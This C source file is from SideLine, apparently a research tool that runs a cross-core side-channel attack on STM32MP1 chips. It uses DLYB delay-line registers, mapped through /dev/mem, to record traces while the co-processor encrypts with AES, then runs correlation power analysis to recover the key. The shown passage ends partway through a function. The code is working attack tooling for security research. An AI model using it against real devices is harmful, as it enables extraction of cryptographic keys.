/**
******************************************************************************
* @file           : main_cortex_A7.c
* @brief          : CA7-to-CM4 side-channel attack using DLYB blocks in
* 					STM32MP1 SoCs
******************************************************************************
* @attention
*
* Copyright (c) Joseph Gravellier 2020 Thales.
* Email: joseph.gravellier@external.thalesgroup.com
* All rights reserved.
*
*
******************************************************************************
*/

#define _GNU_SOURCE
#include "main_cortex_A7.h"

// Utility Variables
uint8_t verbose = 0;
time_t start_time = 0;
long current_time = 0;
struct timespec startTime, endTime;
uint32_t duration = 0;

// Correlation Power Analysis & Filter Variables
double * GlobalVariance;
double * GlobalAverage;
double *** ClassAverage;
double *** Correlation;
double * maxCorrelation;
uint32_t ** ClassPopulation;
uint8_t bnum_selected = 14;
uint8_t localCPA = 0;
uint8_t eFilter = 0;
uint8_t saveCPA = 0;
BWHighPass* cpafilter;
BWLowPass* lowfilter;
uint8_t minByte = 0;
uint8_t maxByte = 16;
uint32_t iTrace = 0;
uint32_t iClass = 0;
uint32_t iTry = 0;
uint32_t iSample = 0;
uint32_t nSample = 0;
uint32_t nTrace = 0;
uint32_t iByte = 0;
uint32_t currentByte = 0;
uint8_t exKeyArray[16] = {0x2d,0xcf,0x46,0x29,0x04,0xb4,0x78,0xd8,0x68,0xa7,0xff,0x3f,0x2b,0xf1,0xfc,0xd9};
uint8_t bestguess[16];

// DLYB calibration variables
uint8_t currentDLval = 41;
uint8_t currentCLKval = 0;
double currentVar = 0;
uint8_t currentMinHW = 0;
uint8_t currentMaxHW = 0;
double currentnTransition = 0;
uint32_t counterHOT = 0;
uint32_t counterCOLD = 0;
uint32_t counterDiscard = 0;

// Register virtual addresses variables
int map_file = 0;
uint32_t DLYB_CFGR = 0;
uint32_t DLYB_CR = 0;
uint32_t SDMMC_CLK = 0;
uint32_t v_base_addr = 0;
uint32_t v_ddr_base_addr = 0;

// GTK variables
GtkWidget *  window;
GtkWidget *  boxView;
GtkWidget *  buttonCalib,*buttonRescale,*buttonUpdate,*buttonByte,*buttonExit;
GtkWidget *	 view;
GtkWidget *  chart;
SlopeScale *scaleView,*  scaleAvg, *scaleCorr;
SlopeItem *seriesView,*   seriesAvg, **seriesCorr;
double *x, *y, *yAvg,*yVar, **yCorr;
gboolean timeoutView;
gboolean timeoutAES;
gboolean exitCallback = 0;
uint8_t viewMode = 0;
uint8_t updateend = 0;
uint8_t AESMode = 0;
uint8_t CPAMode = 0;
uint16_t shiftSpeed = 30;
uint16_t refreshRateAES = 500;
uint16_t refreshRateCPA = 1000;
char legendStr[200];

/*
 * Main function
 */
int main(int argc, char *argv[]) {

	double variance = 0.;
	uint32_t regval = 0;

	char * filename = "SideLine_CM4.elf";
	char command[50];
	char * user_input;
    volatile struct ddr_core{
        volatile uint32_t control;
    } *core;

    Init_CM4(filename);

    //mmap dlyb registers
    Map_Registers(&map_file,(void **) &core, DLYB_BASE_ADRAM, 0x2fff);
    v_base_addr = &core->control;
    printf("v_base_addr = %08x\n\r",v_base_addr);

    //mmap dram registers
    Map_Registers(&map_file,(void **) &core, DRAM_BASE_ADRAM, 0xffff);
    v_ddr_base_addr = &core->control;
    printf("v_ddr_base_addr = %08x\n\r",v_base_addr);

    Write_Register(v_ddr_base_addr,0x0); //Reset communication with CM4

    DLYB_CR = v_base_addr + 0x1000;
    DLYB_CFGR = v_base_addr + 0x1000 + 0x4;
    SDMMC_CLK = v_base_addr + 0x4;

    printf("virtual DLYB_CR address: %08x\n\r",DLYB_CR);
    printf("virtual DLYB_CFGR address: %08x\n\r",DLYB_CFGR);
    printf("virtual SDMMC_CLK address: %08x\n\r",SDMMC_CLK);

    Auto_Find(1, 10,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);

	/* Print Hello Banner */
	printf("\n\r\n\r");
	printf(
	"   _____    __    ___                     \n\r"
	"  / __(_)__/ /__ / (_)__  ___             \n\r"
	" _\\ \\/ / _  / -_) / / _ \\/ -_)	       \n\r"
	"/___/_/\\_,_/\\__/_/_/_//_/\\__/  on STM32\n\r");

	Command_Helper();

	do{

	printf("SideLine>");
	fgets(command,50,stdin);
	command[strcspn(command,"\n")] = '\0';
	user_input = strtok(command," ");

		/********************** NULL COMMAND *******************/
		if(user_input == NULL){
			//do nothing
		}
		/********************** GET MODE ***********************/
		else if((strcmp(user_input,"get")==0) || (strcmp(user_input,"GET")==0))
		{
			printf("Get Mode:\n\r");
			printf("the current dlval is %d\n\r",currentDLval);
			printf("the current clkval is %d\n\r",currentCLKval);
		}

		/********************** SET MODE ***********************/
		else if((strcmp(user_input,"set")==0) || (strcmp(user_input,"SET")==0))
		{
			printf("Set Mode:\n\r");
			//DLYB value (default 41)
			user_input = strtok(NULL," ");
			currentDLval = (user_input == NULL)?41:atoi(user_input);
			printf("dlval has been set to %d\n\r",currentDLval);

			//Clock PLL Div (default 0)
			user_input = strtok(NULL," ");
			currentCLKval = (user_input == NULL)?0:atoi(user_input);
			printf("clkval has been set to %d\n\r",currentCLKval);
		}

		/********************** VIEW MODE **********************/
		else if((strcmp(user_input,"view")==0) || (strcmp(user_input,"VIEW")==0))
		{
			printf("View Mode:\n\r");
			//number of DLYB value to print (default 1000)
			user_input = strtok(NULL," ");
			nSample = (user_input == NULL)?1000:atoi(user_input);
			printf("nSample: %d\n\r",nSample);
			printf("dlval: %d\n\r",currentDLval);
			printf("clkval: %d\n\r",currentCLKval);
			Print_DL_State(nSample,currentDLval,currentCLKval);
			printf("\n\r");

			//init filter
			lowfilter = create_bw_low_pass_filter(4, 15200,3000);

			//gtk
			viewMode = 1;
		   	gtk_init(&argc, &argv);
		   	Init_GTK();
		   	if (timeoutView != 0) {
		   	g_source_remove(timeoutView);
		   	}
		   	viewMode = 0;
		   	printf("\n\r");

			free_bw_high_pass(lowfilter);
		}

		/********************** VAR MODE **********************/
		else if((strcmp(user_input,"var")==0) || (strcmp(user_input,"VAR")==0))
		{
			printf("Measure Variability Mode:\n\r");
			printf("dlval: %d\n\r",currentDLval);
			printf("clkval: %d\n\r",currentCLKval);
			variance = Measure_Variability(currentDLval, currentCLKval);
			Print_DL_State(3,currentDLval,currentCLKval);
			printf("Computed Variance: %f\n\r",variance);
		}

		/********************** FIND MODE **********************/
		else if((strcmp(user_input,"find")==0) || (strcmp(user_input,"FIND")==0))
		{
			//Searched value (default 3640 for 0b111000111000)
			user_input = strtok(NULL," ");
			regval = (user_input == NULL)?3640:atoi(user_input);

			Find_Clock_Delay_Pair(0,127,0,3,regval);
		}

		/********************** AUTO MODE **********************/
		else if((strcmp(user_input,"auto")==0) || (strcmp(user_input,"AUTO")==0))
		{
			printf("Auto configuration Mode:\n\r");
			Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
		}

		/********************** HELP MODE **********************/
		else if((strcmp(user_input,"help")==0) || (strcmp(user_input,"?")==0) || (strcmp(user_input,"man")==0))
		{
			Command_Helper();
		}

		/******************** AES DISPLAY MODE *****************/
		else if((strcmp(user_input,"aes")==0) || (strcmp(user_input,"AES")==0))
		{
			//number of samples
			user_input = strtok(NULL," ");
			nSample = (user_input == NULL)?3500:atoi(user_input);
			//number of traces
			user_input = strtok(NULL," ");
			nTrace = (user_input == NULL)?10000:atoi(user_input);

			iTrace = 0;
			localCPA = 1;
			eFilter = 0;
			counterHOT = 0;
			counterCOLD = 0;
			counterDiscard = 0;

			Write_Register(v_ddr_base_addr,0x0); //Reset communication with CM4
			usleep(100);
			Write_Register(v_ddr_base_addr+0x30,nSample); // send nSample to CM4 for DMA
			Write_Register(v_ddr_base_addr+0x34,TINYAES); // send encryption type to CM4

			Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
			Profile_Init(0);
			printf("\n\rnSample: %d",nSample);
			printf("\n\rnTrace: %d",nTrace);
			printf("\n\rdlval: %d",currentDLval);
			printf("\n\rclkval: %d",currentCLKval);

			// Init time
			start_time = (uint32_t)time(NULL);

			// Init GTK
			AESMode = 1;
		   	gtk_init(&argc, &argv);
			Init_GTK();
			printf("\n\r");
			AESMode = 0;

			//free arrays
			Profile_deInit(0);
		}

		/****************** CPA MODE *******************/
		else if((strcmp(user_input,"cpa")==0) || (strcmp(user_input,"CPA")==0))
		{
			// Recalculate dl clk pair
			Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);

			// Number of DLYB samples to acquire per trace (default 150)
			user_input = strtok(NULL," ");
			nSample = (user_input == NULL)?150:atoi(user_input);
			printf("\n\rnSample: %d",nSample);

			// Number of trace to acquire (default 100000)
			user_input = strtok(NULL," ");
			nTrace = (user_input == NULL)?100000:atoi(user_input);
			printf("\n\rnTrace: %d",nTrace);

			// Enable CPA calculation (default 1 enabled)
			user_input = strtok(NULL," ");
			localCPA = (user_input == NULL)?1:atoi(user_input);
			printf("\n\rnlocalCPA: %d",localCPA);

			// Enable Butterworth Filter (default 1 enabled)
			user_input = strtok(NULL," ");
			eFilter = (user_input == NULL)?1:atoi(user_input);
			printf("\n\rFilter: %d",eFilter);

			// Enable Saving (default 1 enabled)
			user_input = strtok(NULL," ");
			saveCPA = (user_input == NULL)?1:atoi(user_input);
			printf("\n\rsaveCPA: %d",saveCPA);

			// Print info
			printf("\n\rDLval: %d",currentDLval);
			printf("\n\rCLKval: %d",currentCLKval);
			printf("\n\rMinHW: %d",currentMinHW);
			printf("\n\rMaxHW: %d",currentMaxHW);
			printf("\n\rnTransition: %f",currentnTransition);

			counterHOT = 0;
			counterCOLD = 0;
			counterDiscard = 0;
			iTrace = 0;

			Write_Register(v_ddr_base_addr,0x0); //Reset communication with CM4

			// Init Local CPA & profiling
			if(localCPA)
			{
				Profile_Init(localCPA);
			}

			// Init Filter
			if(eFilter)
			{
				cpafilter = create_bw_high_pass_filter(4, 15200, 900);
			}

			// Init time
			start_time = (uint32_t)time(NULL);

			// Print key used by CM4 for the example
			printf("\n\rkey : ");
			for(int k_i = 0 ; k_i < 16 ; k_i++){printf("%02x",exKeyArray[k_i]);}
			printf("\n\r");

			//Send DMA parameters to CM4
			Write_Register(v_ddr_base_addr+0x30,nSample);
			Write_Register(v_ddr_base_addr+0x34,OPENSSL);

			// Init GTK
			CPAMode = 1;
		   	gtk_init(&argc, &argv);
			Init_GTK();
			printf("\n\r");
			CPAMode = 0;

			//free arrays and filters
			free_bw_high_pass(cpafilter);
			Profile_deInit(localCPA);
		}
		else
		{
			printf("Unknown Command %s\n\r",user_input);
		}


	}
	while(1);


}


uint32_t AES_SCA(void)
{
		uint8_t ptArray[16];
		uint8_t ctArray[16];
		uint32_t iSample = 0;
		uint8_t state = 0;
		uint32_t dataArray[nSample];
		uint32_t temp32to8 = 0;
		uint32_t temp8to32=0;
		float filteredDataArray[nSample];
		uint32_t count = 0;
		double mean = 0.;

		//Disable the length sampling by setting SEN bit to ‘0’.
		Write_Register(DLYB_CR,0x1);

		//Enable the length sampling by setting SEN bit to ‘1’.
		Write_Register(DLYB_CR,0x3);

		//Enable all delay cells by setting SEL bits to DLYB_LENGTH and set UNIT to dlval and re-launch LENGTH SAMPLING
		Write_Register(DLYB_CFGR,0xc + (currentDLval << 8));

		// Generate random plain text and print it
		for(int u = 0; u<16 ; u++){ptArray[u] = (uint8_t)rand();}

		// Convert 8bit plaintext to 32bit and send to CM4
		for(int u = 0 ; u < 4 ; u++)
		{
			temp8to32=0;
			for(int v = 0 ; v < 4 ; v++){
				temp8to32 |= (uint32_t)(ptArray[u*4+v])<<(24-8*v);
			}
			Write_Register(v_ddr_base_addr+0x4+u*4,temp8to32);
		}

		//Re-init communication, send *plaintext ready* to CM4
		Write_Register(v_ddr_base_addr,0x1);

		// Wait for CM4 *ready to encrypt*
		while(Read_Register(v_ddr_base_addr) != 2){}

		//send *start encryption* to CM4
		Write_Register(v_ddr_base_addr,0x3);

		//Wait for CM4 *end of encrypt*
		while(Read_Register(v_ddr_base_addr) != 4){}

		//Disable the length sampling by setting SEN bit to ‘0’.
		Write_Register(DLYB_CR,0x1);

		// Import ciphertext from CM4 convert 32bit to 8bit
		for(int u = 0 ; u < 4 ; u++)
		{
			temp32to8 = Read_Register(v_ddr_base_addr+0x14+u*4);

			for(int v = 0 ; v < 4 ; v++)
			{
				ctArray[u*4+v] = (temp32to8 >> (24-v*8)) & 0xff;
			}
		}

		for(iSample = 0 ; iSample  < nSample ; iSample ++)
		{
			dataArray[iSample] = Read_Register(v_ddr_base_addr+0x40+iSample*4);

			count = 0;
			for(int iBit = 0 ; iBit < DLYB_LENGTH ; iBit++)
			{
				count += (dataArray[iSample] >> (16+iBit)) & 1;
			}

			dataArray[iSample] = count;
			mean += count;
		}

		mean = mean/(double)nSample;
		//printf("\n\rmean: %f",mean);

		if((mean > currentMinHW+0.1) && (mean < currentMaxHW-0.1))
		{
			state = 1;

			if(!localCPA)
			{
				printf("\n\rplaintext : ");
				for(int u = 0; u<16 ; u++){printf("%02x",ptArray[u]);}
				printf("\n\r");

				for(iSample = 0 ; iSample < nSample ; iSample++)
				{
					printf("%c",dataArray[iSample]+50);
				}

				//printf("\n\rciphertext : ");
				//for(int u = 0; u<16 ; u++){printf("%02x",ctArray[u]);}
			}
			else
			{

				if(eFilter)
				{

					/*********** FILTER ************/
					//printf("filtered value: \n\r");
					for(iSample = 0 ; iSample < nSample ; iSample++)
					{
						filteredDataArray[iSample] = bw_high_pass(cpafilter,dataArray[iSample]);
						//printf("%f ",filteredDataArray[iSample]);
					}
					//printf("\n\r");

					/*********** PROFILE ************/
					if(!AESMode)
					{
						for(iByte = minByte ; iByte < maxByte ; iByte++)
						{
							//printf("%02x ",ptArray[iByte]);
							ClassPopulation[iByte][ptArray[iByte]] += 1;

							for(iSample = 0 ; iSample < nSample ; iSample++)
							{
								ClassAverage[iByte][ptArray[iByte]][iSample] += (double)filteredDataArray[iSample];
							}
						}
						for(iSample = 0 ; iSample < nSample ; iSample++)
						{

							GlobalVariance[iSample] += pow((double)filteredDataArray[iSample],2);
							GlobalAverage[iSample] += (double)filteredDataArray[iSample];
						}
					}
					else
					{
						for(iSample = 0 ; iSample < nSample ; iSample++)
						{
							GlobalAverage[iSample] += (double)filteredDataArray[iSample];
						}
					}



				}
				else
				{
					/*********** PROFILE ************/
					if(!AESMode)
					{
						for(iByte = minByte ; iByte < maxByte ; iByte++)
						{

							ClassPopulation[iByte][ptArray[iByte]] += 1;
							for(iSample = 0 ; iSample < nSample ; iSample++)
							{
								ClassAverage[iByte][ptArray[iByte]][iSample] += (double)dataArray[iSample];
							}
						}

						for(iSample = 0 ; iSample < nSample ; iSample++)
						{
							GlobalVariance[iSample] += pow((double)dataArray[iSample],2);
							GlobalAverage[iSample] += (double)dataArray[iSample];
						}
					}
					else
					{
						for(iSample = 0 ; iSample < nSample ; iSample++)
						{
							GlobalAverage[iSample] += (double)dataArray[iSample];
						}
					}


				}

			}
		}
		else
		{
			state = 0;
		}

		return state;
}

void Profile_Init(int cpa)
{
	printf("\n\rInitializing profiling accumulators...");
	GlobalVariance = (double*)malloc(sizeof(double)*nSample);
	GlobalAverage = (double*)malloc(sizeof(double)*nSample);



	for(int iSample = 0 ; iSample < nSample ; iSample++)
	{
		GlobalVariance[iSample] = 0.;
		GlobalAverage[iSample] = 0.;
	}

	if(cpa)
	{
		maxCorrelation = (double*)malloc(sizeof(double)*nSample);

		for(int iSample = 0 ; iSample < nSample ; iSample++)
		{
			maxCorrelation[iClass] = 0.;
		}

		ClassPopulation = (uint32_t**)malloc(sizeof(uint32_t*)*NBYTE);
		ClassAverage = (double***)malloc(sizeof(double**)*NBYTE);
		Correlation = (double***)malloc(sizeof(double**)*NBYTE);

		for(int iByte = 0 ; iByte < NBYTE ; iByte++)
		{
			ClassAverage[iByte] = (double**)malloc(sizeof(double*)*NCLASS);
			Correlation[iByte] = (double**)malloc(sizeof(double*)*NCLASS);
			ClassPopulation[iByte] = (uint32_t*)malloc(sizeof(uint32_t)*NCLASS);


			for(int iClass = 0 ; iClass < NCLASS ; iClass++)
			{
				ClassPopulation[iByte][iClass] = 0;
				ClassAverage[iByte][iClass] = (double*)malloc(sizeof(double)*nSample);
				Correlation[iByte][iClass] = (double*)malloc(sizeof(double)*nSample);

				for(int iSample = 0 ; iSample < nSample ; iSample++)
				{
					ClassAverage[iByte][iClass][iSample] = 0.;
					Correlation[iByte][iClass][iSample] = 0.;
				}
			}
		}
	}

}


void Profile_deInit(int cpa)
{
	printf("\n\rFree memory...\n\r");
	free(GlobalAverage);
	free(GlobalVariance);

	if(cpa)
	{
		free(ClassAverage);
		free(maxCorrelation);
		free(Correlation);
		free(ClassPopulation);
	}


}

uint8_t Launch_AES(void)
{
	double mean = Get_Mean_HW(50,currentDLval,currentCLKval);

	if(mean >= currentMaxHW-0.1)
	{
		//printf("Too hot ! - mean : %f\n\r",mean);
		//printf("\n\rToo hot, countertemp: %d\n\r",counterDiscard);
		usleep(1000);
		counterDiscard++;
		counterHOT++;
	}
	else if((mean > currentMinHW+0.1) && (mean < currentMaxHW-0.1))
	{
		//printf("ok ! - mean : %f\n\r",mean);
		iTrace += AES_SCA();

		if((iTrace%1000==0) || (iTrace==nTrace))
		{
			current_time = (uint32_t)time(NULL);
			printf("\n\rProcessed traces: %d - Time: %.2f/%.2fmin - Progression: %.2f%%",iTrace,(double)(current_time - start_time)/60.0,((double)(current_time - start_time)/((double)(iTrace)/nTrace))/60.0,((double)(iTrace)/nTrace)*100);
		}

		if(counterDiscard > 0)
		{
			counterDiscard--;
		}
	}
	else
	{
		//printf("\n\rcountertemp: %d, mean = %f, currentMinHW = %d, currentMaxHW = %d",counterDiscard,mean,currentMinHW,currentMaxHW);
		//printf("\n\rToo cold, countertemp: %d\n\r",counterDiscard);
		Increase_Temperature(500);
		counterDiscard++;
		counterCOLD++;
	}

	if(counterDiscard == 1000)
	{
		Auto_Find(1, 1,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
		counterDiscard = 0;
	}

	if(iTrace == nTrace){return 0;}else{return 1;}
}

/*
 * Command helper that can be called with "help" or "?" command
 */
void Command_Helper(void)
{
	printf("\n\rCommand Helper:");
	printf("\n\r-------------------------------------------------------------------------");
	printf("\n\r|    cmd    |              Parameters            |      Description     |");
	printf("\n\r|-----------------------------------------------------------------------|");
	printf("\n\r| set       | <dlValue> <clkValue>               | Set dlval and clkval |");
	printf("\n\r| get       |                                    | Print dlval clkval   |");
	printf("\n\r| view      | <nSample>                          | Print DLYB state     |");
	printf("\n\r| var       |                                    | Compute variance     |");
	printf("\n\r| find      | <decimal value>                    | Test a configuration |");
	printf("\n\r| auto      |                                    | Auto DLYB calibration|");
	printf("\n\r| aes       | <nSample> <nTrace>                 | AES overview test    |");
	printf("\n\r| cpa       | <nSample> <nTrace> <eCPA> <eFilter>| AES CPA attack       |");
	printf("\n\r-------------------------------------------------------------------------");
	printf("\n\r\n\rexample : \"view 10\" = print 10 times DLYB state and launch GTK \n\r\n\r");
}

/*
 * Start CM4 encryption application
 */
void Init_CM4(char * filename)
{
	char linux_cmd[200];
	system("rm /tmp/info");
	system("echo stop > /sys/class/remoteproc/remoteproc0/state");
	sprintf(linux_cmd,"rm /lib/firmware/%s",filename);
	printf("%s\n\r",linux_cmd);
	system(linux_cmd);
	sprintf(linux_cmd,"cp /home/root/SideLine/%s /lib/firmware",filename);
	printf("%s\n\r",linux_cmd);
	system(linux_cmd);
	sprintf(linux_cmd,"echo %s > /sys/class/remoteproc/remoteproc0/firmware",filename);
	printf("%s\n\r",linux_cmd);
	system(linux_cmd);
	printf("echo start > /sys/class/remoteproc/remoteproc0/state\n\r");
	system("echo start > /sys/class/remoteproc/remoteproc0/state");
}

/*
 * Obtain virtual addresses to control hardware registers
 */
int Map_Registers(int *fd, void **c, int c_addr, int c_size)
{
if ((*fd = open("/dev/mem", O_RDWR | O_SYNC)) == -1) {
fprintf(stderr, "Error: could not open /dev/mem!\n");
return -1;
}

if ((*c = mmap(NULL, c_size, PROT_READ | PROT_WRITE,
MAP_SHARED, *fd, c_addr)) == (void *) -1) {

fprintf(stderr, "Error: could not map memory to file!\n");
return -1;
}

return 0;
}

void Init_GTK(void)
{
   	window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
   	boxView    = gtk_box_new(GTK_ORIENTATION_VERTICAL, 2);
   	gtk_box_set_spacing (GTK_BOX(boxView),20);
   	gtk_window_set_default_size(GTK_WINDOW(window), 20, 30);
   	gtk_window_set_deletable(GTK_WINDOW(window),FALSE);
   	gtk_window_set_resizable(GTK_WINDOW(window),FALSE);
   	gtk_window_set_title (GTK_WINDOW(window),"SideLine");
   	//gtk_window_set_decorated(GTK_WINDOW(window),FALSE);
   	gtk_window_set_keep_above(GTK_WINDOW(window),TRUE);//not handled in wayland
   	gtk_window_move(GTK_WINDOW(window),0,0);//not handled in wayland
   	g_signal_connect(G_OBJECT(window), "destroy", G_CALLBACK(gtk_main_quit), NULL);
   	g_signal_connect(G_OBJECT(window), "destroy", G_CALLBACK(gtk_main_quit), NULL);
   	gtk_container_add(GTK_CONTAINER(window), boxView);

	if(viewMode) //view Mode
	{
		printf("\n\rView window initialization...");
		buttonCalib = gtk_button_new_with_label("Calibrate");
		buttonRescale = gtk_button_new_with_label("Rescale");
		buttonExit = gtk_button_new_with_label("Exit");
		g_signal_connect(G_OBJECT(buttonCalib), "clicked", G_CALLBACK(autocalibration), NULL);
		g_signal_connect(G_OBJECT(buttonRescale), "clicked", G_CALLBACK(rescale), NULL);
		g_signal_connect(G_OBJECT(buttonExit), "clicked", G_CALLBACK(exitview), NULL);
	   	gtk_box_pack_start(GTK_BOX(boxView), buttonCalib, FALSE, TRUE, 2);
		gtk_box_pack_start(GTK_BOX(boxView), buttonRescale, FALSE, FALSE, 4);
		gtk_box_pack_start(GTK_BOX(boxView), buttonExit, FALSE, FALSE, 4);
		chart = slope_chart_new_detailed("DLYB Oscilloscope",700,350,0);
		x = g_malloc(nSample * sizeof(double));
		y = g_malloc(nSample * sizeof(double));


		clock_gettime(CLOCK_MONOTONIC_RAW, &startTime);
		for (iSample = 0; iSample < nSample; iSample++)
		{
			x[iSample] = iSample;
			y[iSample] = (double)(bw_low_pass(lowfilter,(float)(Get_HW(currentDLval,currentCLKval))));
		}
		clock_gettime(CLOCK_MONOTONIC_RAW, &endTime);
		duration = (uint32_t)((endTime.tv_sec - startTime.tv_sec) * 1000 + (endTime.tv_nsec - startTime.tv_nsec) / 1000000);
		printf("\n\rDuration: %d ms", duration);

		scaleView = slope_xyscale_new_axis("Sample", "Amplitude", "Average");
		slope_scale_set_layout_rect(scaleView, 0, 0, 1, 1);
		slope_chart_add_scale(SLOPE_CHART(chart), scaleView);

		seriesView = slope_xyseries_new_filled("Average", x, y, nSample, "l-");
		slope_scale_add_item(scaleView, seriesView);

		timeoutView = g_timeout_add(duration+50, (GSourceFunc) view_timer_callback, (gpointer) chart);
		printf("\n\rView window init done\n\r");

	}
	else if(AESMode) //AES Mode
	{

		printf("\n\rAES window initialization...");
		buttonExit = gtk_button_new_with_label("Exit");
		g_signal_connect(G_OBJECT(buttonExit), "clicked", G_CALLBACK(exitview), NULL);
		gtk_box_pack_start(GTK_BOX(boxView), buttonExit, FALSE, FALSE, 4);
		chart = slope_chart_new_detailed("AES Results",700,350,0);

		clock_gettime(CLOCK_MONOTONIC_RAW, &startTime);
		for(iTry = 0 ;  iTry < refreshRateAES ;  iTry++)
		{
			 if(Launch_AES()==0){break;}
		}
		clock_gettime(CLOCK_MONOTONIC_RAW, &endTime);
		duration = (uint32_t)((endTime.tv_sec - startTime.tv_sec) * 1000 + (endTime.tv_nsec - startTime.tv_nsec) / 1000000);
		printf("\n\rDuration: %d ms for %d traces per timeout\n\r", duration,refreshRateAES);

		x = g_malloc(nSample * sizeof(double));
		y = g_malloc(nSample * sizeof(double));
		for (iSample = 0; iSample < nSample; iSample++)
		{
			x[iSample] = iSample;
			y[iSample] = GlobalAverage[iSample]/iTrace;
		}

		scaleAvg = slope_xyscale_new_axis("Sample", "Amplitude", "Average");
		slope_scale_set_layout_rect(scaleAvg, 0, 0, 1, 1);
		slope_chart_add_scale(SLOPE_CHART(chart), scaleAvg);

		seriesAvg = slope_xyseries_new_filled("Average", x, y, nSample, "l-");
		slope_scale_add_item(scaleAvg, seriesAvg);

		timeoutAES = g_timeout_add(duration, (GSourceFunc) aes_timer_callback, (gpointer) chart);
		printf("\n\rAES window init done\n\r");
	}
	else if(CPAMode)
	{
		printf("\n\rCPA window initialization...");
		buttonUpdate = gtk_button_new_with_label("Update");
		buttonByte = gtk_button_new_with_label("Byte++");
		buttonExit = gtk_button_new_with_label("Exit");
		g_signal_connect(G_OBJECT(buttonUpdate), "clicked", G_CALLBACK(cpaupdate), NULL);
		g_signal_connect(G_OBJECT(buttonByte), "clicked", G_CALLBACK(byteselect), NULL);
		g_signal_connect(G_OBJECT(buttonExit), "clicked", G_CALLBACK(exitview), NULL);
		gtk_box_pack_start(GTK_BOX(boxView), buttonUpdate, FALSE, FALSE, 4);
		gtk_box_pack_start(GTK_BOX(boxView), buttonByte, FALSE, FALSE, 4);
		gtk_box_pack_start(GTK_BOX(boxView), buttonExit, FALSE, FALSE, 4);
		chart = slope_chart_new_detailed("CPA Results",700,420,0);

		currentByte 	= 0;
		x    	= (double*)g_malloc(nSample * sizeof(double));
		yAvg    = (double*)g_malloc(nSample * sizeof(double));
		yVar    = (double*)g_malloc(nSample * sizeof(double));
		yCorr   = (double**)g_malloc(NCLASS * sizeof(double*));

		for (iClass = 0; iClass < NCLASS ; iClass++)
		{
		  yCorr[iClass] = (double*)g_malloc(nSample * sizeof(double));

		  for (iSample = 0; iSample < nSample ; iSample++)
		  {
			  yCorr[iClass][iSample] = 0.;
		  }
		}
		printf("\n\rCorr Array Init OK");

		clock_gettime(CLOCK_MONOTONIC_RAW, &startTime);
		for(iTry = 0 ;  iTry < refreshRateCPA ;  iTry++)
		{
			 if(Launch_AES()==0){break;}
		}
		clock_gettime(CLOCK_MONOTONIC_RAW, &endTime);
		duration = (uint32_t)((endTime.tv_sec - startTime.tv_sec) * 1000 + (endTime.tv_nsec - startTime.tv_nsec) / 1000000);
		printf("\n\rDuration: %d ms for %d traces per timeout", duration,refreshRateCPA);

		for (iSample = 0; iSample < nSample ; iSample++)
		{
			x[iSample]   = iSample;
			yAvg[iSample] = GlobalAverage[iSample]/ iTrace;
		}

		for (iByte = 0; iByte < NBYTE ; iByte++)
		{
			bestguess[iByte] = 0;
		}

		printf("\n\rAvg and Var Array Init OK");

		scaleAvg = slope_xyscale_new_axis("Sample", "Amplitude", "Average");
		slope_scale_set_layout_rect(scaleAvg, 0, 0, 1, 1);
		slope_chart_add_scale(SLOPE_CHART(chart), scaleAvg);

		scaleCorr = slope_xyscale_new_axis("Sample", "Correlation", "Correlation ");
		slope_scale_set_layout_rect(scaleCorr, 0, 1, 1, 1);
		slope_chart_add_scale(SLOPE_CHART(chart), scaleCorr);

		seriesAvg = slope_xyseries_new_filled("Average", x, yAvg, nSample, "l-");
		slope_scale_add_item(scaleAvg, seriesAvg);

		seriesCorr = (SlopeItem **)malloc(sizeof(SlopeItem *)*3);

		seriesCorr[0] = slope_xyseries_new_filled("Wrong", x, maxCorrelation, nSample, "la");
		slope_scale_add_item(scaleCorr, seriesCorr[0]);

		seriesCorr[1] = slope_xyseries_new_filled("Best", x, yCorr[bestguess[currentByte]], nSample, "g-");
		slope_scale_add_item(scaleCorr, seriesCorr[1]);

		seriesCorr[2] = slope_xyseries_new_filled("Right", x, yCorr[exKeyArray[currentByte]], nSample, "r-");
		slope_scale_add_item(scaleCorr, seriesCorr[2]);

		timeoutAES = g_timeout_add(duration, (GSourceFunc) aes_timer_callback, (gpointer) chart);

		printf("\n\rCPA window init done\n\r");
	}
	else
	{
		printf("\n\rError in mode!");
		exit(0);
	}

	gtk_widget_show_all(chart);
	gtk_widget_show_all(window);

	printf("\n\rPlease exit window screen to access the command line\n\r");
	//gtk_window_maximize(GTK_WINDOW(window));
	gtk_main();


	if(CPAMode)
	{
		g_free(x);
		g_free(yAvg);
		g_free(yVar);
		g_free(yCorr);
	}
	else
	{
		g_free(x);
		g_free(y);
	}
}

/*
 * Rescale screen window to match with the dataset displayed
 */
static gboolean rescale(GtkWidget *button, gpointer data)
{
	printf("\n\rRescaling !");
	slope_scale_remove_item(scaleView,seriesView);
	seriesView = slope_xyseries_new_filled("DLYB State", x, y, nSample, "l-");
   	slope_scale_add_item(scaleView, seriesView);
	return TRUE;
}

/*
 * Launch calibration to enhance delay line precision
 */
static gboolean autocalibration(GtkWidget *button, gpointer data)
{
	printf("\n\rAuto-calibrating !");
	Auto_Find(1, 10,&currentDLval,&currentCLKval,&currentMinHW,&currentMaxHW,&currentnTransition,&currentVar);
	printf("\n\rPlease exit the graph window on screen to access the command line\n\r");
	rescale(buttonRescale,NULL);
	return TRUE;
}

/*
 * Exit GTK screen
 */
static gboolean exitview(GtkWidget *button, gpointer data)
{
	printf("Exiting\n\r");

	if(updateend)
	{
		gtk_widget_destroy(window);
		gtk_widget_destroy(chart);
		gtk_main_quit();
		updateend = 0;
	}
	else
	{
		exitCallback = 1;
	}

	return TRUE;
}


/*
 * Update and display DLYB oscilloscope values
 */
static gboolean view_timer_callback(GtkWidget *widget)
{
	if (timeoutView != 0) {
	g_source_remove(timeoutView);
	}
	timeoutView = 0;

	clock_gettime(CLOCK_MONOTONIC_RAW, &startTime);
	for(iSample = 0 ; iSample < nSample ; iSample++)
	{
		if(iSample+shiftSpeed < nSample)
		{
			y[iSample] = y[iSample+shiftSpeed];
		}
		else
		{
